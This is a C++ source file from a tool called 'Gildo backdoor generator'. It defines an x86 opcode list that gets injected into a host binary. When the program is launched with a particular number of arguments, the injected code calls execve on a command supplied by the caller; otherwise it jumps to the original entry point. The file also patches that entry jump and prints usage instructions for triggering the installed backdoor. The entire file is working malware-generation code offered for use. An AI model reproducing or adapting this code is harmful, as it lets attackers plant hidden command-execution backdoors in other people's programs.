/* list/list1.C   the first backdoor opcodes list
 *
 * Gildo backdoor generator is copyright (C) 2002 Mauro Meneghin.
 * All rights reserved. The software is redistributable under
 * the licence given in the file "Licence" distributed in the
 * Gbkdoor archive.
 */



#include "list1.h"
#include "../instructionSet.h"

#include <stdlib.h>


List1::List1() 
{
  int i;
/* here I create the opcodes with the right parameters
 * (offsets,immediate numbers and so on eheh
 */
  unsigned char *par;  //variable parameter of the op
  m_nOP=8; /////////fix
  m_OPList=(OpCode**)malloc(m_nOP*sizeof(OpCode*));
  par=(unsigned char*)malloc(4);
  par[3]=LIST1_BASH_ARGC;
  m_OPList[0]=new OpCode(IS.CMPB_cESP_BYTE,par); //cmp [esp], byte   
  par=(unsigned char*)malloc(7);
  //*(unsigned int*)&par[3]=oldentry-nextinstraddr; //I adjust the oldentry jump later from outside
  m_OPList[1]=new OpCode(IS.JGEeJMP_DWORD,par);  //jmp to old entry point //TO FIX from OUTER
  m_OPList[2]=new OpCode(IS.XOR_EAX_EAX); 
  par=(unsigned char*)malloc(2);
  par[1]=11;
  m_OPList[3]=new OpCode(IS.MOV_AL_BYTE,par); //here mov al,11
  par=(unsigned char*)malloc(4);
  par[3]=4*LIST1_BASH_ARGC;
  m_OPList[4]=new OpCode(IS.LEA_ECX_cESPpN,par); //lea ecx,[esp+N]
  m_OPList[5]=new OpCode(IS.MOV_EBX_cECX);  //mov ebx,[ecx]
//set the environment
  m_OPList[6]=new OpCode(IS.XOR_EDX_EDX);
  m_OPList[7]=new OpCode(IS.INT80);

  //assign size 
  m_size=0;
  for(i=0;i<m_nOP;i++)  
    m_size+=m_OPList[i]->GetSize();
}


int List1::AdjustEntry(int which, unsigned int oldentry,unsigned int addr)
{
  if(which!=1) return 1;
  delete m_OPList[1];
  unsigned char *par=(unsigned char*)malloc(7);
  *(unsigned int*)&par[3]=oldentry-addr;
  m_OPList[1]=new OpCode(IS.JGEeJMP_DWORD,par);  //jmp to old entry point //TO FIX from OUTER
  return 0;
}



List1::~List1()
{
  int i;
  for(i=0;i<m_nOP;i++)
    delete m_OPList[i];
  free(m_OPList);
}



void List1::DumpHelp(const char* file) const
{
  int i;
  printf("backdoor List1: simply execute the command given\n");  
  printf("now, you can easily use the backdoor installed so:\n"
         "\t%s ",file);
  for(i=1;i<LIST1_BASH_ARGC-1;i++)
    printf("%d ",i);
  printf("<program_you_want> [arg1 [arg2 [...]]]\n");
  printf("for example as:\n"
         "\t%s ",file);
  for(i=1;i<LIST1_BASH_ARGC-1;i++)
    printf("%d ",i);
  printf("/bin/ls /\n");
  printf("remember to use full path for the <program_you_want>\n");
}

